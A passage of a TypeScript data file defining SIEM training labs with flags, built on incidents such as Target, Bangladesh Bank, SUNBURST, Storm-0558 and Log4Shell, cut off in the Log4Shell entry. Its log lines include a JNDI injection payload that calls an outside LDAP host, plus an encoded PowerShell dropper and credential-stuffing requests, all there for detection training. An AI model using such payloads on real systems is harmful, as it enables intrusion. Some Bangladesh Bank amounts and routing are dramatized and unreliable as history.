import type { SiemLabScenario } from './siemTypes';

export const SIEM_LABS: SiemLabScenario[] = [
  // ───────────────────────── Suricata ─────────────────────────
  {
    id: 'siem-suricata-target-2013',
    title: 'Suricata: The 2013 Target Breach — Alerts Ignored',
    difficulty: 'Medium',
    tool: 'suricata',
    datasetLabel: 'eve.json — 11 alerts, Nov 27 – Dec 11 2013',
    briefing:
      'This recreates the real November-December 2013 Target breach through the lens of the network malware ' +
      'detection appliance (FireEye, modeled here as a Suricata-style IDS console) that genuinely flagged the ' +
      'point-of-sale memory-scraping malware — twice — weeks before the breach became public. Roughly 40 ' +
      'million card numbers were stolen in the gap between detection and action. Your job: find the alerts that ' +
      'mattered inside a queue dominated by routine policy noise.',
    objectives: [
      { text: 'Review the full alert queue', why: 'A SOC console is mostly noise — seeing the full volume is what makes the signal-to-noise problem real instead of abstract.' },
      { text: 'Filter to just the malware.binary category', why: 'Cutting straight to the high-severity malware classification is how a real analyst triages a large queue under time pressure.' },
      { text: 'Identify the gap between first detection and the malware continuing to spread, and capture the flag', why: 'The entire lesson of this incident is that gap — the detection technology worked exactly as designed, the triage process did not.' },
    ],
    hints: ['malware.binary', 'BlackPOS'],
    totalFlags: 1,
    entries: [
      { timestamp: '2013-11-27 09:02', severity: 'Low', line: 'category=policy source=10.20.4.03 msg="USB storage device inserted"' },
      { timestamp: '2013-11-27 11:15', severity: 'Low', line: 'category=policy source=10.20.4.19 msg="Software update check completed"' },
      { timestamp: '2013-11-28 14:40', severity: 'Low', line: 'category=policy source=10.20.4.22 msg="Failed login, account locked after 3 attempts"' },
      { timestamp: '2013-11-30 14:12', severity: 'Low', line: 'category=policy source=10.20.4.12 msg="USB device inserted"' },
      {
        timestamp: '2013-11-30 18:47',
        severity: 'High',
        line:
          'category=malware.binary source=10.20.4.55 (POS-REGISTER-114) msg="Malware binary detected: memory-scraping ' +
          'process behavior matching a BlackPOS-family signature; attempted upload to an external FTP staging host was blocked"',
      },
      { timestamp: '2013-12-01 08:03', severity: 'Low', line: 'category=policy source=10.20.4.30 msg="Scheduled antivirus definition update"' },
      {
        timestamp: '2013-12-02 03:15',
        severity: 'High',
        line:
          'category=malware.binary source=10.20.4.61 (POS-REGISTER-119) msg="Same BlackPOS-family malware detected on a ' +
          'second point-of-sale register — lateral spread confirmed"',
      },
      { timestamp: '2013-12-02 09:20', severity: 'Low', line: 'category=policy source=10.20.4.15 msg="Printer offline"' },
      { timestamp: '2013-12-05 16:44', severity: 'Low', line: 'category=policy source=10.20.4.08 msg="VPN session established"' },
      { timestamp: '2013-12-11 12:00', severity: 'Low', line: 'category=policy source=10.20.4.27 msg="Password changed by user"' },
      {
        timestamp: '2013-12-18',
        severity: 'Critical',
        line:
          'ANALYST NOTE (retrospective): the malware.binary alerts on 2013-11-30 and 2013-12-02 correctly flagged this exact ' +
          'BlackPOS-family malware roughly two full weeks before the breach became public on 2013-12-18 — and the malware ' +
          'kept exfiltrating card data the entire time in between. The alerts were never escalated in time, a failure ' +
          'widely attributed to alert-volume overload and an auto-quarantine feature reportedly left disabled. ' +
          'flag{suricata_flagged_blackpos_weeks_before_disclosure_alert_fatigue}',
      },
    ],
  },
  {
    id: 'siem-suricata-cobalt-strike-beacon',
    title: 'Suricata: Cobalt Strike Beacon Pattern Detection',
    difficulty: 'Hard',
    tool: 'suricata',
    datasetLabel: 'eve.json — 9 alerts, last 4 hours',
    briefing:
      'A workstation is generating regular outbound HTTPS connections to an external host, every sixty seconds, ' +
      'almost to the second. This is the signature "jitter-light" check-in pattern of a C2 beacon framework — ' +
      'the same class of tooling behind the majority of major ransomware intrusions since 2020, precisely ' +
      'because its traffic blends into normal HTTPS unless someone looks at the timing pattern specifically.',
    objectives: [
      { text: 'Review the alert queue for the affected workstation', why: 'Regular beaconing is invisible in a single alert — you only see it across the pattern.' },
      { text: 'Filter for the repeated destination and inspect the interval between hits', why: 'A ~60-second-almost-exact interval to the same external host is the behavioral tell — normal browsing traffic is irregular and bursty.' },
      { text: 'Confirm the beacon indicator and capture the flag', why: 'This is exactly the kind of detection modern EDR/IDS tooling automates — understanding the underlying pattern by hand is what lets an analyst trust (or challenge) what the tool reports.' },
    ],
    hints: ['185.220.101.47', 'beacon'],
    totalFlags: 1,
    entries: [
      { timestamp: '14:02:01', severity: 'Low', line: 'source=WKSTN-014 dest=8.8.8.8:443 proto=TLS msg="Outbound HTTPS, known-good CDN"' },
      { timestamp: '14:02:59', severity: 'Medium', line: 'source=WKSTN-014 dest=185.220.101.47:443 proto=TLS msg="Outbound HTTPS to uncategorized host"' },
      { timestamp: '14:03:14', severity: 'Low', line: 'source=WKSTN-020 dest=151.101.1.69:443 proto=TLS msg="Outbound HTTPS, known-good CDN"' },
      { timestamp: '14:03:58', severity: 'Medium', line: 'source=WKSTN-014 dest=185.220.101.47:443 proto=TLS msg="Outbound HTTPS to uncategorized host"' },
      { timestamp: '14:04:59', severity: 'Medium', line: 'source=WKSTN-014 dest=185.220.101.47:443 proto=TLS msg="Outbound HTTPS to uncategorized host"' },
      { timestamp: '14:05:59', severity: 'Medium', line: 'source=WKSTN-014 dest=185.220.101.47:443 proto=TLS msg="Outbound HTTPS to uncategorized host"' },
      { timestamp: '14:06:12', severity: 'Low', line: 'source=WKSTN-031 dest=13.107.42.14:443 proto=TLS msg="Outbound HTTPS, known-good CDN"' },
      { timestamp: '14:06:59', severity: 'Medium', line: 'source=WKSTN-014 dest=185.220.101.47:443 proto=TLS msg="Outbound HTTPS to uncategorized host"' },
      {
        timestamp: '14:07:00',
        severity: 'Critical',
        line:
          'category=c2.beacon source=WKSTN-014 dest=185.220.101.47:443 msg="Beacon pattern confirmed: 5 consecutive ' +
          'connections to the same uncategorized host at ~59-60 second intervals — consistent with Cobalt Strike ' +
          'jitter-light C2 check-in behavior. flag{cobalt_strike_beacon_confirmed_via_interval_analysis}"',
      },
    ],
  },

  // ───────────────────────── Chronicle ─────────────────────────
  {
    id: 'siem-chronicle-bangladesh-bank',
    title: 'Chronicle: The 2016 Bangladesh Bank SWIFT Heist',
    difficulty: 'Hard',
    tool: 'chronicle',
    datasetLabel: 'SWIFT_TRANSFER events — Feb 4-5 2016',
    briefing:
      'This recreates the real February 2016 Bangladesh Bank heist — one of the largest attempted bank robberies ' +
      'in history. Attackers who had compromised the bank\'s SWIFT payment infrastructure submitted fraudulent ' +
      'transfer instructions attempting to move $951 million out through the Federal Reserve Bank of New York, ' +
      'timed around a weekend to delay detection. Most transfers were blocked, but roughly $81 million reached ' +
      'accounts in the Philippines. One transfer was caught for a strikingly mundane reason: a misspelled ' +
      'beneficiary name triggered a manual compliance hold.',
    objectives: [
      { text: 'Search for all SWIFT_TRANSFER events in the window', why: 'Reviewing the full batch the way a fraud analyst would is what surfaces the timing anomaly across all the requests at once.' },
      { text: 'Note how tightly clustered the request timestamps are', why: 'Dozens of high-value transfers submitted in one overnight window during a bank holiday closure is itself a red flag, designed to buy the attacker time.' },
      { text: 'Search specifically for the misspelled beneficiary name', why: 'This is the exact detail that broke the real case — a beneficiary name anomaly is a classic manual-review trigger, not a technical signature match.' },
      { text: 'Capture the flag on the compliance hold note', why: 'Understanding exactly why one transfer among dozens got flagged is the transferable lesson — human review of anomalies still matters inside heavily automated payment systems.' },
    ],
    hints: ['target.event_type = "SWIFT_TRANSFER"', 'fandation'],
    totalFlags: 1,
    entries: [
      { timestamp: '2016-02-04 23:12', eventType: 'SWIFT_TRANSFER', line: 'ref=TX10391 amount=$29,000,000 beneficiary="Global Trade Partners LLC" bank="Wells Fargo, NY" status=EXECUTED' },
      { timestamp: '2016-02-04 23:41', eventType: 'SWIFT_TRANSFER', line: 'ref=TX10392 amount=$20,000,000 beneficiary="Global Trade Partners LLC" bank="Wells Fargo, NY" status=EXECUTED' },
      { timestamp: '2016-02-05 00:07', eventType: 'SWIFT_TRANSFER', line: 'ref=TX10393 amount=$81,000,000 beneficiary="Shalika Fandation" bank="RCBC, Philippines" status=EXECUTED (later traced/laundered via casinos)' },
      {
        timestamp: '2016-02-05 00:22',
        eventType: 'SWIFT_TRANSFER',
        line: 'ref=TX10394 amount=$870,000,000 beneficiary="Shalika Fandation" bank="Pan Asia Bank, Sri Lanka" status=BLOCKED — sanctions-list keyword match on beneficiary bank name',
      },
      { timestamp: '2016-02-05 00:38', eventType: 'SWIFT_TRANSFER', line: 'ref=TX10395 amount=$36,000,000 beneficiary="Global Trade Partners LLC" bank="Wells Fargo, NY" status=BLOCKED — Fed compliance hold, request volume anomaly' },
      { timestamp: '2016-02-05 00:51', eventType: 'SWIFT_TRANSFER', line: 'ref=TX10396 amount=$29,000,000 beneficiary="Global Trade Partners LLC" bank="Wells Fargo, NY" status=BLOCKED — same-day duplicate request pattern' },
      {
        timestamp: '2016-02-05 09:14',
        eventType: 'COMPLIANCE_HOLD',
        line:
          'RCBC routing bank note on TX10393: "Beneficiary name \'Shalika Fandation\' does not match any known registered ' +
          'entity — likely misspelling of \'Foundation\'. Flagging for manual review is standard practice on any ' +
          'beneficiary name anomaly, regardless of transfer size." This single spelling anomaly is the exact detail ' +
          'that alerted investigators after the fact — not a technical signature, a human noticing something that just ' +
          'looked slightly wrong. flag{misspelled_beneficiary_shalika_fandation_flagged_swift_fraud}',
      },
    ],
  },
  {
    id: 'siem-chronicle-dns-tunneling',
    title: 'Chronicle: DNS Tunneling Data Exfiltration',
    difficulty: 'Hard',
    tool: 'chronicle',
    datasetLabel: 'NETWORK_DNS events — internal resolver, last 6 hours',
    briefing:
      'DNS is one of the most permissive outbound protocols in most networks — almost every firewall allows it ' +
      'unrestricted, which is exactly why it gets abused for command-and-control and data exfiltration. A ' +
      'workstation is generating an unusual volume of TXT record lookups against long, encoded-looking ' +
      'subdomain labels — a classic DNS tunneling signature.',
    objectives: [
      { text: 'Search DNS events from the internal resolver', why: 'DNS logs are the primary evidence source for this technique — the tunnel rides entirely inside ordinary-looking name resolution traffic.' },
      { text: 'Filter to TXT record queries specifically', why: 'TXT records can carry arbitrary text data, making them the record type of choice for tunneling tools — isolating them cuts through routine A/AAAA lookup noise immediately.' },
      { text: 'Identify the one domain receiving dozens of long, encoded-looking subdomain queries and capture the flag', why: 'A domain getting hit with high-volume, high-entropy subdomain labels — instead of the same handful of names every browser normally requests — is the tunneling tell.' },
    ],
    hints: ['metadata.event_type = "NETWORK_DNS"', 'TXT'],
    totalFlags: 1,
    entries: [
      { timestamp: '02:14:01', eventType: 'NETWORK_DNS', line: 'query=www.google.com type=A source=WKSTN-101 answer=142.250.72.4' },
      { timestamp: '02:14:03', eventType: 'NETWORK_DNS', line: 'query=outlook.office365.com type=A source=WKSTN-101 answer=52.96.164.2' },
      { timestamp: '02:14:47', eventType: 'NETWORK_DNS', line: 'query=a8f3c9e1b2.updates-cdn-relay.net type=TXT source=WKSTN-101 answer="7b22636f6465223a22303031227d"' },
      { timestamp: '02:14:52', eventType: 'NETWORK_DNS', line: 'query=d2e77a01f4.updates-cdn-relay.net type=TXT source=WKSTN-101 answer="7b22636f6465223a22303032227d"' },
      { timestamp: '02:14:58', eventType: 'NETWORK_DNS', line: 'query=91c4b7d0aa.updates-cdn-relay.net type=TXT source=WKSTN-101 answer="7b22636f6465223a22303033227d"' },
      { timestamp: '02:15:10', eventType: 'NETWORK_DNS', line: 'query=cdn.cloudflare.net type=A source=WKSTN-114 answer=104.16.85.20' },
      { timestamp: '02:15:14', eventType: 'NETWORK_DNS', line: 'query=5fa9e2c6b8.updates-cdn-relay.net type=TXT source=WKSTN-101 answer="7b22636f6465223a22303034227d"' },
      {
        timestamp: '02:20:33',
        eventType: 'DETECTION',
        line:
          'ANALYST SUMMARY: 47 TXT queries to *.updates-cdn-relay.net from WKSTN-101 in 6 minutes, each a unique ' +
          'high-entropy subdomain label with a base64/hex-decodable TXT answer — classic DNS tunneling exfiltration, ' +
          'not a legitimate CDN update check. flag{dns_tunneling_confirmed_via_txt_query_volume_and_entropy}',
      },
    ],
  },

  // ───────────────────────── tcpdump ─────────────────────────
  {
    id: 'siem-tcpdump-supply-chain-beacon',
    title: 'tcpdump: SolarWinds-Style Supply-Chain Beacon',
    difficulty: 'Hard',
    tool: 'tcpdump',
    datasetLabel: 'capture.pcap — 14 packets, internal segment',
    briefing:
      'This recreates the network-level detection pattern behind the real 2020 SolarWinds/SUNBURST supply-chain ' +
      'compromise. Investigators (Mandiant/FireEye) eventually traced the backdoor\'s command-and-control traffic ' +
      'to a distinctive pattern of DNS-based check-ins against avsvmcloud[.]com-style domains that encoded a ' +
      'victim identifier into the subdomain itself, deliberately built to look like ordinary software update ' +
      'traffic from a trusted vendor.',
    objectives: [
      { text: 'Capture all traffic from the affected host', why: 'Raw packet capture is the ground truth — no log aggregation layer stands between you and what was actually sent on the wire.' },
      { text: 'Filter to port 53 (DNS) traffic specifically', why: 'The SUNBURST backdoor used DNS as its primary check-in channel precisely because DNS is rarely inspected as closely as HTTP traffic.' },
      { text: 'Identify the encoded, vendor-mimicking domain pattern and capture the flag', why: 'A domain crafted to look like a legitimate software vendor\'s infrastructure, encoding a victim ID into the subdomain, is exactly the disguised-C2 pattern that let this backdoor operate undetected for months.' },
    ],
    hints: ['port 53', 'avsvmcloud'],
    totalFlags: 1,
    entries: [
      { timestamp: '10:41:02.114001', line: 'IP 10.10.30.5.52144 > 8.8.8.8.53: A? www.microsoft.com. (32)' },
      { timestamp: '10:41:02.201552', line: 'IP 8.8.8.8.53 > 10.10.30.5.52144: A 20.190.160.14 (48)' },
      { timestamp: '10:42:15.887012', line: 'IP 10.10.30.5.52201 > 8.8.8.8.53: A? 7x9f2a1e.appsync-api.avsvmcloud.com. (54)' },
      { timestamp: '10:42:15.930441', line: 'IP 8.8.8.8.53 > 10.10.30.5.52201: A 20.140.88.12 (48)' },
      { timestamp: '10:45:03.112009', line: 'IP 10.10.30.5.52260 > 8.8.8.8.53: A? office365.com. (30)' },
      { timestamp: '10:47:16.004881', line: 'IP 10.10.30.5.52301 > 8.8.8.8.53: A? c3d8a90f.appsync-api.avsvmcloud.com. (54)' },
      { timestamp: '10:52:16.771002', line: 'IP 10.10.30.5.52340 > 8.8.8.8.53: A? 1b7e2f4c.appsync-api.avsvmcloud.com. (54)' },
      {
        timestamp: '10:52:16.812200',
        line:
          'ANALYST NOTE: three separate lookups (7x9f2a1e / c3d8a90f / 1b7e2f4c).appsync-api.avsvmcloud.com at roughly ' +
          '5-minute intervals — a domain deliberately crafted to resemble legitimate Microsoft/vendor infrastructure, ' +
          'with each unique subdomain label encoding this specific victim host, exactly the real SUNBURST C2 ' +
          'check-in pattern identified in the 2020 SolarWinds supply-chain compromise. ' +
          'flag{sunburst_style_dns_beacon_confirmed_via_encoded_subdomain}',
      },
    ],
  },
  {
    id: 'siem-tcpdump-credential-stuffing',
    title: 'tcpdump: Credential Stuffing Attack at the Packet Level',
    difficulty: 'Medium',
    tool: 'tcpdump',
    datasetLabel: 'capture.pcap — customer login endpoint, 9 packets',
    briefing:
      'Credential stuffing looks completely different from a normal brute force at the packet level — instead of ' +
      'one username against many passwords, this is ONE breached password tried against many different ' +
      'usernames, betting on password reuse from an unrelated site\'s breach. Reading the raw HTTP POST traffic ' +
      'is the clearest way to see this pattern with no log-aggregation abstraction in the way.',
    objectives: [
      { text: 'Capture traffic to the login endpoint', why: 'Seeing the actual POST bodies is what makes the "one password, many usernames" pattern undeniable, versus inferring it from summarized log counts.' },
      { text: 'Filter to port 443/login traffic', why: 'Isolating just the authentication endpoint traffic removes the surrounding normal browsing noise.' },
      { text: 'Confirm the same password appears across many different usernames and capture the flag', why: 'That specific pattern — one password, many usernames — is what distinguishes credential stuffing from a normal brute force (one username, many passwords) at a glance.' },
    ],
    hints: ['login', 'password=Summer2024!'],
    totalFlags: 1,
    entries: [
      { timestamp: '03:01:12.001', line: 'IP 45.33.12.9.51120 > 10.10.5.20.443: POST /login HTTP/1.1 [body: username=jsmith&password=Summer2024!]' },
      { timestamp: '03:01:12.340', line: 'IP 10.10.5.20.443 > 45.33.12.9.51120: HTTP/1.1 401 Unauthorized' },
      { timestamp: '03:01:13.002', line: 'IP 45.33.12.9.51121 > 10.10.5.20.443: POST /login HTTP/1.1 [body: username=agarcia&password=Summer2024!]' },
      { timestamp: '03:01:13.355', line: 'IP 10.10.5.20.443 > 45.33.12.9.51121: HTTP/1.1 401 Unauthorized' },
      { timestamp: '03:01:14.010', line: 'IP 45.33.12.9.51122 > 10.10.5.20.443: POST /login HTTP/1.1 [body: username=mwong&password=Summer2024!]' },
      { timestamp: '03:01:14.290', line: 'IP 10.10.5.20.443 > 45.33.12.9.51122: HTTP/1.1 401 Unauthorized' },
      { timestamp: '03:01:15.006', line: 'IP 45.33.12.9.51123 > 10.10.5.20.443: POST /login HTTP/1.1 [body: username=tpatel&password=Summer2024!]' },
      { timestamp: '03:01:15.401', line: 'IP 10.10.5.20.443 > 45.33.12.9.51123: HTTP/1.1 200 OK — login successful' },
      {
        timestamp: '03:01:15.450',
        line:
          'ANALYST NOTE: 4 login attempts from the same source IP within 3 seconds, EVERY ONE using the identical ' +
          'password=Summer2024! against 4 completely different usernames — one succeeded (tpatel). This is the ' +
          'exact signature of credential stuffing: a password breached elsewhere, sprayed across a username list, ' +
          'betting on reuse. flag{credential_stuffing_confirmed_same_password_many_usernames}',
      },
    ],
  },

  // ───────────────────────── Splunk ─────────────────────────
  {
    id: 'siem-splunk-ransomware-kill-chain',
    title: 'Splunk: Correlating a Ransomware Kill Chain',
    difficulty: 'Hard',
    tool: 'splunk',
    datasetLabel: 'index=main — 8 events, last 45 minutes',
    briefing:
      'A single event in isolation rarely tells the whole story — a phishing click, a malware detection, a new ' +
      'admin account, and a burst of file-modify activity each look survivable on their own. Correlated together ' +
      'in one search, across every log source feeding this Splunk index, they are an active ransomware kill ' +
      'chain in progress. This is the exact "correlate, don\'t just alert" workflow real SOC teams run inside ' +
      'Splunk Enterprise Security every day.',
    objectives: [
      { text: 'Search the full index for the affected host', why: 'Splunk\'s value is pulling together events from completely different log sources (email gateway, EDR, AD, file server) into one searchable timeline.' },
      { text: 'Correlate the sequence: phishing click, malware detonation, new admin account, mass file changes', why: 'This is precisely the kill-chain correlation pattern a real SIEM correlation rule is built to catch — no single event triggers it, the SEQUENCE does.' },
      { text: 'Capture the flag on the correlation summary', why: 'Recognizing the full chain (not just the first alert) is what turns "one weird email" into "declare a ransomware incident and isolate this host right now."' },
    ],
    hints: ['host=WKSTN-207', 'ransomware'],
    totalFlags: 1,
    entries: [
      { timestamp: '09:12:04', line: 'host=WKSTN-207 sourcetype=email_gateway msg="User jharris clicked link in email from invoice-support@vendor-billing.example"' },
      { timestamp: '09:14:41', line: 'host=WKSTN-207 sourcetype=edr msg="Suspicious process launched: invoice_Q3.exe -> powershell.exe -EncodedCommand"' },
      { timestamp: '09:14:55', line: 'host=WKSTN-207 sourcetype=edr severity=high msg="Malware detonation confirmed: dropper contacted external C2 185.220.101.9"' },
      { timestamp: '09:22:10', line: 'host=WKSTN-207 sourcetype=ad_audit msg="New account created: svc_backup_temp, added to Domain Admins group"' },
      { timestamp: '09:31:02', line: 'host=FILESRV03 sourcetype=file_audit msg="1,204 files renamed with .locked extension in \\\\FILESRV03\\shared in the last 90 seconds"' },
      { timestamp: '09:31:15', line: 'host=FILESRV03 sourcetype=file_audit msg="Ransom note README_RECOVER.txt written to 14 directories"' },
      { timestamp: '09:31:20', line: 'host=WKSTN-105 sourcetype=file_audit msg="File encryption activity spreading to second host via svc_backup_temp credentials"' },
      {
        timestamp: '09:32:00',
        line:
          'CORRELATION SUMMARY: phishing click (09:12) -> malware detonation + C2 callback (09:14) -> rogue Domain Admin ' +
          'account created (09:22) -> mass file encryption across two hosts (09:31) — a complete ransomware kill chain ' +
          'from initial access to impact in under 20 minutes. flag{splunk_correlated_full_ransomware_kill_chain}',
      },
    ],
  },
  {
    id: 'siem-splunk-bruteforce-stats-count',
    title: 'Splunk: Brute-Force Detection via stats count by src_ip',
    difficulty: 'Medium',
    tool: 'splunk',
    datasetLabel: 'index=auth — 10 events, last 5 minutes',
    briefing:
      'The single most common real SIEM correlation rule in existence is some version of "N failed logins from ' +
      'one source within M minutes." Rather than trusting a pre-built rule blindly, this lab has you reconstruct ' +
      'the logic by hand: search the raw authentication log, and confirm for yourself which source IP actually ' +
      'crosses the brute-force threshold.',
    objectives: [
      { text: 'Search index=auth for failed login events', why: 'Raw authentication logs are the ground truth a correlation rule is built on top of — confirming the pattern by hand builds the intuition to trust (or challenge) the automated rule.' },
      { text: 'Identify which source IP has an unusually high failure count in a short window', why: 'A brute-force attempt is defined by volume against one target from one source in a short time, not by any single failed login being inherently suspicious.' },
      { text: 'Capture the flag on the account that was ultimately compromised', why: 'Confirming whether the brute-force attempt actually succeeded is what turns a noisy-but-harmless alert into an active incident requiring password reset and session revocation.' },
    ],
    hints: ['sourcetype=auth "Failed password"', 'Accepted password'],
    totalFlags: 1,
    entries: [
      { timestamp: '02:01:01', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:04', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:07', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:10', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:13', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:16', line: 'sourcetype=auth src_ip=192.168.1.44 user=jsmith msg="Failed password" note="single typo, normal user behavior"' },
      { timestamp: '02:01:19', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:22', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Failed password"' },
      { timestamp: '02:01:25', line: 'sourcetype=auth src_ip=45.33.12.9 user=admin msg="Accepted password"' },
      {
        timestamp: '02:01:26',
        line:
          'stats count by src_ip, user: 45.33.12.9 made 7 failed attempts against "admin" within 24 seconds, the 8th ' +
          'attempt succeeded ("Accepted password") — this crosses any reasonable brute-force threshold (e.g. the ' +
          '"25 failures in 2 minutes" style correlation rule) and the account was compromised on this attempt. ' +
          'flag{splunk_bruteforce_confirmed_admin_account_compromised}',
      },
    ],
  },

  // ───────────────────────── Microsoft Sentinel ─────────────────────────
  {
    id: 'siem-sentinel-storm-0558',
    title: 'Microsoft Sentinel: The 2023 Storm-0558 Email Breach',
    difficulty: 'Hard',
    tool: 'sentinel',
    datasetLabel: 'OfficeActivity — 7 events, June 2023',
    briefing:
      'This recreates the real 2023 Storm-0558 incident (Microsoft\'s own naming for the threat actor), in which ' +
      'a China-based group forged authentication tokens using a stolen Microsoft account signing key to access ' +
      'Exchange Online mailboxes at roughly 25 organizations, including US government agencies. The forged tokens ' +
      'looked valid to Exchange Online\'s own validation logic — the anomaly investigators actually keyed on was ' +
      'the mail-access PATTERN itself, not a rejected authentication.',
    objectives: [
      { text: 'Query OfficeActivity for mailbox access events on the affected accounts', why: 'The forged tokens passed authentication checks completely — log correlation on ACCESS PATTERNS, not failed logins, is what actually surfaced this intrusion.' },
      { text: 'Identify the client application and access pattern that doesn\'t match normal user behavior', why: 'A mailbox being accessed by an unfamiliar client ID, from an unfamiliar ASN, at a volume no human reading email manually would produce, is the tell.' },
      { text: 'Capture the flag on the detection summary', why: 'This incident is a case study in why token/session validity alone is not proof of legitimacy — behavioral anomaly detection caught what cryptographic validation could not.' },
    ],
    hints: ['SecurityEvent | where EventID == 4624', 'anomalous'],
    totalFlags: 1,
    entries: [
      { timestamp: '2023-06-15 03:12', eventType: 'MailItemsAccessed', line: 'user=svc.diplomat@agency.gov client_ip=198.51.100.4 client_app_id=unfamiliar-app-9f2a items_accessed=1' },
      { timestamp: '2023-06-15 03:12', eventType: 'MailItemsAccessed', line: 'user=svc.diplomat@agency.gov client_ip=198.51.100.4 client_app_id=unfamiliar-app-9f2a items_accessed=48' },
      { timestamp: '2023-06-15 03:13', eventType: 'MailItemsAccessed', line: 'user=svc.diplomat@agency.gov client_ip=198.51.100.4 client_app_id=unfamiliar-app-9f2a items_accessed=112' },
      { timestamp: '2023-06-15 09:41', eventType: 'MailItemsAccessed', line: 'user=svc.diplomat@agency.gov client_ip=10.20.1.5 client_app_id=OutlookWebApp items_accessed=3 (normal daytime usage)' },
      { timestamp: '2023-06-15 03:14', eventType: 'TokenValidation', line: 'token_signature=valid signing_key=MSA-consumer-key token_scope=enterprise-mail — signature validated successfully, scope mismatch not enforced' },
      {
        timestamp: '2023-06-15 04:00',
        eventType: 'DETECTION',
        line:
          'ANALYST SUMMARY: mailbox accessed from an unfamiliar client application ID and external IP, at 3 AM, ' +
          'retrieving over 160 items in under 2 minutes — an anomalous access pattern far exceeding any plausible ' +
          'manual mail-reading pace. The session token validated successfully because it was signed with a ' +
          'legitimate (but improperly-scoped and, as later confirmed, stolen) Microsoft signing key — the forged ' +
          'token itself was cryptographically valid, and only the anomalous access pattern gave the intrusion away. ' +
          'flag{storm_0558_forged_token_detected_via_access_pattern_anomaly}',
      },
    ],
  },
  {
    id: 'siem-sentinel-impossible-travel',
    title: 'Microsoft Sentinel: Impossible Travel Detection',
    difficulty: 'Medium',
    tool: 'sentinel',
    datasetLabel: 'SigninLogs — 6 events, last 3 hours',
    briefing:
      'User and Entity Behavior Analytics (UEBA) works by learning what "normal" looks like for a specific person, ' +
      'then flagging deviations — the classic example being "impossible travel": a login from one country, ' +
      'followed by another login from a location no real person could have physically reached in the time between ' +
      'the two sign-ins. That is exactly what this queue shows for one employee account.',
    objectives: [
      { text: 'Query SigninLogs for the affected user', why: 'Sign-in logs carry both timestamp and geolocation for every authentication — the two fields UEBA needs to compute physical plausibility.' },
      { text: 'Compare the location and timestamp of consecutive sign-ins', why: 'The math is simple once you see both events side by side: distance divided by time available has to be physically possible for a real human traveler.' },
      { text: 'Capture the flag confirming the impossible-travel finding', why: 'This is one of the highest-confidence UEBA detections that exists — there is no legitimate explanation for one person being in two countries within minutes of each other.' },
    ],
    hints: ['SigninLogs | where UserPrincipalName == "r.alvarez@meridiancorp.example"', 'impossible'],
    totalFlags: 1,
    entries: [
      { timestamp: '08:02:11', eventType: 'SigninLogs', line: 'user=r.alvarez@meridiancorp.example location="Accra, Ghana" ip=41.66.12.4 result=success device=corp-laptop-04' },
      { timestamp: '08:45:30', eventType: 'SigninLogs', line: 'user=r.alvarez@meridiancorp.example location="Accra, Ghana" ip=41.66.12.4 result=success device=corp-laptop-04' },
      { timestamp: '09:03:12', eventType: 'SigninLogs', line: 'user=r.alvarez@meridiancorp.example location="Kyiv, Ukraine" ip=95.67.12.201 result=success device=unrecognized-device' },
      { timestamp: '09:04:01', eventType: 'SigninLogs', line: 'user=r.alvarez@meridiancorp.example location="Kyiv, Ukraine" ip=95.67.12.201 result=success device=unrecognized-device app=OWA' },
      { timestamp: '11:20:00', eventType: 'SigninLogs', line: 'user=t.whitfield@meridiancorp.example location="London, UK" ip=81.2.69.14 result=success device=corp-laptop-11 (unrelated, normal user)' },
      {
        timestamp: '09:04:15',
        eventType: 'UEBA_ALERT',
        line:
          'IMPOSSIBLE TRAVEL: r.alvarez signed in from Accra, Ghana at 08:45 and again from Kyiv, Ukraine at 09:03 — a ' +
          'straight-line distance of roughly 6,000 km in 18 minutes, physically impossible for any real traveler. The ' +
          'second sign-in also came from an unrecognized device, strongly indicating the account credentials (not the ' +
          'device) were what actually made the trip. flag{sentinel_impossible_travel_ghana_to_kyiv_18_minutes}',
      },
    ],
  },

  // ───────────────────────── IBM QRadar ─────────────────────────
  {
    id: 'siem-qradar-log4shell-exploitation',
    title: 'IBM QRadar: Log4Shell Mass Exploitation Detection',
    difficulty: 'Hard',
    tool: 'qradar',
    datasetLabel: 'Offense #4471 — web + DNS + EDR events, Dec 2021',
    briefing:
      'This recreates the real detection pattern security teams used during the December 2021 Log4Shell ' +
      '(CVE-2021-44228) mass-exploitation event — one of the most severe and widely-exploited vulnerabilities ever ' +
      'disclosed. The giveaway is a JNDI lookup string (${jndi:ldap://...}) appearing anywhere in ordinary web ' +
      'request fields — a User-Agent, a search box, a login field — followed by the affected server making its own ' +
      'outbound LDAP connection it has no legitimate reason to ever make.',
    objectives: [
      { text: 'Search web access logs for the JNDI lookup pattern', why: 'The literal string "${jndi:" appearing in any logged request field is the single highest-signal indicator of Log4Shell exploitation attempts — it has essentially no legitimate use.' },
      { text: 'Correlate that request with the web server\'s own outbound connections', why: 'A web server does not normally initiate outbound LDAP connections on its own — one immediately following a JNDI-pattern request is the confirmation that exploitation, not just a scan attempt, succeeded.' },
      { text: 'Capture the flag on the offense correlation summary', why: 'This exact web-request-then-outbound-LDAP correlation is what let defending teams distinguish "someone probed us" from "we were actually compromised" during the Log4Shell event.' },
    ],
    hints: ['jndi:ldap', 'outbound LDAP'],
    totalFlags: 1,
    entries: [
      { timestamp: '2021-12-10 14:02', severity: 'Low', line: 'category=web_access source=203.0.113.9 msg="GET /search?q=laptop User-Agent: Mozilla/5.0"' },
      { timestamp: '2021-12-10 14:15', severity: 'Critical', line: 'category=web_access source=198.51.100.77 msg="GET / User-Agent: ${jndi:ldap://45.33.12.9:1389/Exploit}"' },
      { timestamp: '2021-12-10 14:15', severity: 'Low', line: 'category=web_access source=203.0.113.9 msg="GET /product/8841 User-Agent: Mozilla/5.0"' },
      { timestamp: '2021-12-10 14:15', severity: 'Critical', line: 'category=network_egress source=WEB-APP-03 dest=45.33.12.9:1389 proto=LDAP msg="Outbound LDAP connection initiated by web application server — no legitimate business reason for this server to query an external LDAP host"' },
